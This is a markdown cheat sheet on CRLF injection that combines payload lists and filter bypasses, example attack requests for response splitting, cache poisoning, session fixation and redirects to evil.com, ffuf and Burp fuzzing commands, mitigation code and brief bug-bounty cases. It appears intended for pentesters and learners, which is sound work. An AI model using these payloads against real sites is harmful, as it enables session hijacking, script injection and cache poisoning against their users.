---
title: CRLF Injection
description: Exploiting carriage return and line feed injection to manipulate HTTP responses
tags:
  - injection
  - web
  - http
  - response-splitting
---

# CRLF Injection

## Overview

CRLF injection exploits improper handling of carriage return (`\r`, `%0d`) and line feed (`\n`, `%0a`) characters to inject arbitrary headers or content into HTTP responses.

**Impact:** XSS, cache poisoning, session fixation, open redirect, HTTP response splitting

## Attack Vectors

### 1. HTTP Response Splitting

```http
GET /redirect?url=https://evil.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### 2. Header Injection

```http
# Set-Cookie injection
/profile?name=victim%0d%0aSet-Cookie:%20admin=true

# Location header manipulation
/redirect?url=/%0d%0aLocation:%20https://evil.com
```

### 3. Log Injection

```http
# Inject fake log entries
/login?username=admin%0d%0a[SUCCESS]%20admin%20logged%20in
```

### 4. Email Header Injection

```http
POST /contact
email=victim@test.com%0d%0aBcc:attacker@evil.com&message=test
```

## Payloads

### Basic CRLF

```
%0d%0a
\r\n
%0aSet-Cookie:admin=true
%0d%0aLocation:https://evil.com
```

### Double Encoding

```
%250d%250a
%25%30%64%25%30%61
```

### Unicode Encoding

```
\u000d\u000a
%E5%98%8A%E5%98%8D
```

### Mixed Encodings

```
%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK
\rSet-Cookie: session=hijacked\n
%E5%98%8D%E5%98%8ALocation: https://evil.com
```

### Bypasses

```
# Space variations
%20%0d%0a
%09%0d%0a

# Null byte + CRLF
%00%0d%0a

# UTF-8 overlong encoding
%c0%8a (LF)
%c0%8d (CR)

# Case variations (some parsers)
%0D%0a
%0d%0A
```

## Detection

**Manual Testing:**

1. Inject `%0d%0a` in all user inputs (URL params, headers, cookies, POST data)
2. Check response headers for injected content
3. Test with browser DevTools Network tab
4. Look for split responses or injected headers

**Automated:**

```bash
# Burp Intruder payloads
%0d%0aSet-Cookie: test=1
%0aLocation: https://evil.com
\r\nX-Injected: true

# FFUF
ffuf -u https://target.com/redirect?url=FUZZ -w crlf.txt -mc 200,302 -mr "Set-Cookie|Location"
```

**Tools:**

- Burp Suite (Collaborator for OOB)
- OWASP ZAP
- CRLFuzz
- `crlfmap` (custom scripts)

## Exploitation

### XSS via Response Splitting

```http
GET /page?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>
```

### Cache Poisoning

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com%0d%0aX-Cache-Key: poisoned
```

Response cached with injected header → serves to other users.

### Session Fixation

```http
/login?next=/%0d%0aSet-Cookie:%20sessionid=attacker-controlled-value
```

### Open Redirect Bypass

```http
# Original: /redirect?url=https://trusted.com
/redirect?url=https://trusted.com%0d%0aLocation:%20https://evil.com
```

## Mitigation

**Input Validation:**

```python
# Python example
import re

def sanitize_input(user_input):
    # Remove CRLF characters
    return re.sub(r'[\r\n]', '', user_input)

# Better: use URL encoding library
from urllib.parse import quote
safe_url = quote(user_input, safe='')
```

**Framework-level:**

```python
# Django - automatic escaping
from django.utils.http import url_has_allowed_host_and_scheme

# Flask - use built-in redirect validation
from flask import redirect, url_for
return redirect(url_for('safe_endpoint'))

# Express.js
app.use((req, res, next) => {
    for (let key in req.query) {
        req.query[key] = req.query[key].replace(/[\r\n]/g, '');
    }
    next();
});
```

**Output Encoding:**

- Encode user input before including in HTTP headers
- Use framework's built-in redirect functions
- Validate redirect URLs against whitelist

## Real-World Examples

### Twitter (2014)

- CRLF injection in URL shortener
- Allowed arbitrary header injection
- $5,000 bounty

### Shopify (2016)

```http
/admin/redirect?url=/%0d%0aSet-Cookie:%20staff_token=attacker-value
```

- Session fixation via CRLF
- $500 bounty

### PayPal

```http
/checkout?return_url=https://paypal.com%0d%0aLocation:%20https://evil.com
```

- Open redirect bypass
- Critical severity

## Hunting Tips

1. **Target Redirect Parameters:** `?url=`, `?next=`, `?redirect=`, `?return=`
2. **Test All Input Vectors:** Headers, cookies, POST data, JSON fields
3. **Check Error Messages:** Some apps leak CRLF in error responses
4. **Look for Log Files:** Admin panels that display logs
5. **Test Email Forms:** Contact forms, password resets
6. **Cache Layers:** CDNs may cache poisoned responses
7. **Encoding Bypasses:** Try double/triple encoding if filtered

## References

- [OWASP - CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HackerOne CRLF Reports](https://hackerone.com/reports?query=CRLF)
- [CRLFuzz Tool](https://github.com/dwisiswant0/crlfuzz)

---

**Severity:** Medium to High (depending on exploitation)  
**CVSS:** 6.1 - 8.1 (with XSS/cache poisoning)  
**CWE:** CWE-93 (Improper Neutralization of CRLF Sequences)
